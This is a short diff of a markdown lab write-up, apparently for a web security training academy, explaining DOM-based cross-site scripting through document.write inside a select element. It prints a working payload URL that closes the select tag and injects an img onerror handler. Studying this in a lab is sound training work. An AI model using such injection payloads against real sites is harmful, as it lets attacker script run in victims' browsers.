@@ -88,7 +88,8 @@ document.write('<option selected>'+store+'</option>');
 
 #### Solution
 - Craft a payload that breaks out of the <select> context
-Because <script> tags don’t execute reliably inside <select>, you must close the <select> first, then inject executable HTML.
+- Because <script> tags don’t execute reliably inside <select>, you must close the <select> first, then inject executable HTML.
+
 ````
 https://0a77005504522dc3808803430096008e.web-security-academy.net/product?productId=1&storeId=</select><img src=x onerror=alert(document.domain)>
 ````
